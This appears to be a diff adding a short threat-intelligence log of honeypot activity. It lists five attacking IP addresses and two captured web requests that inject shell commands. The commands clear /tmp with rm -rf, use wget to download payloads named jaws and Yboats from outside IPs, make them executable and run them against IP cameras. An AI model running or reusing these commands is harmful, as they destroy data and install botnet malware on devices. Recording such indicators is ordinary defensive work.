@@ -1,0 +1,12 @@
+Top 5 Attacking IPs
+111.26.94.226
+222.188.235.34
+125.138.102.9
+59.182.19.203
+119.1.135.91
+
+Malware download activity:
+
+/shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws
+
+/shell?cd+/tmp;rm+Yboats.arm+Yboats.arm7;wget+http:/\\/93.123.85.27/Yboats.arm7;chmod+777+Yboats.arm7;./Yboats.arm7+ipcams;wget+hxxp:/\\/93.123.85.27/Yboats.arm;chmod+777+Yboats.arm;./Yboats.arm+ipcams
